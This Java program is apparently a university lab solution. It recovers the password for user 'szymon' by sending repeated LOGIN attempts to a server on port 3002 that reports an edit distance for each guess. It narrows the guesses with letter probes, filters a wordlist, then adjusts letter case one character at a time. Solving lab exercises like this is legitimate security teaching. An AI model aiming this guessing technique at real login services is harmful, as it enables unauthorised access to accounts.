import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class Main {
    public static void main(String[] args) throws IOException {
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String distances = "";
        PasswordChecker checker = new PasswordChecker();
        checker.readPasswords("./src/fetch.txt");
        String foundPass = null;
        Integer foundDist = 0;

        //Chenge localhost to galdos.kis.agh.edu.pl
        String host = "localhost";

        Integer max = 0;
        for(int i = 0; i < alphabet.length(); ++i) {
            Socket echoSocket = null;
            PrintWriter out = null;
            BufferedReader in = null;

            try {
                echoSocket = new Socket(host, 3002);
                out = new PrintWriter(echoSocket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
            } catch (UnknownHostException e) {
                System.err.println("Don't know about host.");
                System.exit(1);
            } catch (IOException e) {
                System.err.println("Couldn't get I/O for the connection.");
                System.exit(1);
            }

            out.println("LOGIN szymon;" +  alphabet.substring(i,i+1));
            Integer distance = Integer.parseInt(in.readLine());
            distances += distance;
            if(distance > max) {
                max = distance;
            }

            out.close();
            in.close();
            echoSocket.close();
        }
        checker.deletePasswordsLen(max);

        String letters = "";
        for(int i = 0; i < alphabet.length(); ++i) {
            if(Integer.parseInt(distances.substring(i,i+1)) < max) {
                letters += alphabet.substring(i,i+1);
            }
        }
        checker.deletePasswordsLetters(letters);

        Integer min = max;
        for(int i = 0; i<checker.getPasswords().size(); i++) {
            Socket echoSocket = null;
            PrintWriter out = null;
            BufferedReader in = null;

            try {
                echoSocket = new Socket(host, 3002);
                out = new PrintWriter(echoSocket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
            } catch (UnknownHostException e) {
                System.err.println("Don't know about host.");
                System.exit(1);
            } catch (IOException e) {
                System.err.println("Couldn't get I/O for the connection.");
                System.exit(1);
            }

            out.println("LOGIN szymon;" +  checker.getPasswords().get(i));
            Integer distance = Integer.parseInt(in.readLine());
            if(distance == 0) {
                System.out.println("Hasło to: "+checker.getPasswords().get(i));
            }
            else if(distance < min) {
                System.out.println("Znaleziono lepsze dopasowanie: "+checker.getPasswords().get(i)+" distance="+distance);
                foundPass = checker.getPasswords().get(i);
                foundDist = distance;
            }

            out.close();
            in.close();
            echoSocket.close();
        }
        System.out.println("Znaleziono najlepsze dopasowanie: "+foundPass+" musisz zmienić "+foundDist+" znaków na wielkie");
        String currentPassword = foundPass;
        currentPassword = currentPassword.toLowerCase();
        int distForPastPass = 0;
        int distForCurrentPass = 0;
        Integer iterations = 0;

        while(true) {
            Socket echoSocket = null;
            PrintWriter out = null;
            BufferedReader in = null;

            try {
                echoSocket = new Socket(host, 3002);
                out = new PrintWriter(echoSocket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
            } catch (UnknownHostException e) {
                System.err.println("Don't know about host.");
                System.exit(1);
            } catch (IOException e) {
                System.err.println("Couldn't get I/O for the connection.");
                System.exit(1);
            }

            Integer levDist = 0;
            System.out.println(currentPassword);
            out.println("LOGIN szymon;" + currentPassword);
            System.out.println((levDist=Integer.parseInt(in.readLine())));
            if(levDist==0) {
                System.out.println("Well Done");
                break;
            }
            distForPastPass = distForCurrentPass;
            distForCurrentPass = levDist;
            String pass = "";
            for(int i = 0; i < currentPassword.length(); ++i) {
                if(i<iterations-1) {
                    pass += currentPassword.substring(i,i+1);
                }
                else if(i == iterations -1) {
                    if(distForPastPass<distForCurrentPass) {
                        pass += currentPassword.substring(i,i+1).toLowerCase();
                        distForCurrentPass = distForPastPass;
                    }
                    else {
                        pass += currentPassword.substring(i,i+1);
                    }
                }
                else if(i==iterations) {
                    pass += currentPassword.substring(i,i+1).toUpperCase();
                }
                else {
                    pass += currentPassword.substring(i,i+1);
                }
            }
            currentPassword = pass;
            iterations++;
            out.close();
            in.close();
            echoSocket.close();
        }
    }
}
